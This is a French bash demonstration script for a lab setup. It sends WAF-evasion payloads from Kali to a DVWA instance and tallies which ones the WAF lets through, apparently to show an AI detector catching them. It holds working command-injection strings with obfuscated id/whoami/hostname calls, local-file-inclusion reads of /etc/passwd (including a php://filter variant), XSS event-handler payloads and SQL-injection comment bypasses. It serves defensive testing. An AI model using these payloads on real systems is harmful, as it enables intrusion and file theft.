#!/bin/bash
# Démonstration — rejeu de variantes d'évasion avancées à travers le WAF (Phase 08).
# À lancer depuis Kali, dans ~/collecte (session DVWA active, niveau low).
# But : montrer les attaques que le WAF laisse passer (200) et que l'IA rattrape.
# Chaque ligne affiche le code de réponse du WAF ; 200 = évasion non bloquée.
set -u
B=http://192.168.30.10/dvwa
COOKIE=cj.txt
passe=0 ; bloque=0

marque() {
  if [ "$2" = "200" ]; then passe=$((passe+1)); etat="PASSE WAF"; else bloque=$((bloque+1)); etat="bloque  "; fi
  printf "  [%s] %-4s %-5s %s\n" "$etat" "$1" "$2" "$3"
}
get()  { code=$(curl -s -b "$COOKIE" -G "$B/vulnerabilities/$2/" --data-urlencode "$3=$4" --data-urlencode "Submit=Submit" -o /dev/null -w "%{http_code}"); marque "$1" "$code" "$4"; }
post() { code=$(curl -s -b "$COOKIE" --data-urlencode "ip=$1" --data-urlencode "Submit=Submit" "$B/vulnerabilities/exec/" -o /dev/null -w "%{http_code}"); marque "RCE" "$code" "$1"; }

echo "=== RCE : injection de commande (evasion) ==="
post '127.0.0.1|id'
post '127.0.0.1%0aid'
post '127.0.0.1&whoami'
post '127.0.0.1;w`h`oami'
post '127.0.0.1;$(hostname)'
post '127.0.0.1|cat${IFS}/etc/hostname'

echo "=== LFI/RFI : inclusion de fichier (evasion) ==="
get LFI fi page 'file:///etc/passwd'
get LFI fi page 'php://filter/convert.base64-encode/resource=/etc/passwd'
get LFI fi page '....//....//....//etc/passwd'

echo "=== XSS : script reflechi (evasion) ==="
get XSS xss_r name '<svg/onload=confirm`1`>'
get XSS xss_r name '<x onclick=alert(1) id=x>cliquer'
get XSS xss_r name '<details/open/ontoggle=alert(1)>'

echo "=== SQLi : injection (evasion) ==="
get SQLi sqli id '1 /*!50000OR*/ 1=1'
get SQLi sqli id '1%0bor%0b1=1'

echo
echo "Bilan : $passe attaque(s) passee(s) au WAF, $bloque bloquee(s)."
echo "Les attaques PASSE WAF sont les evasions que l'IA doit rattraper."
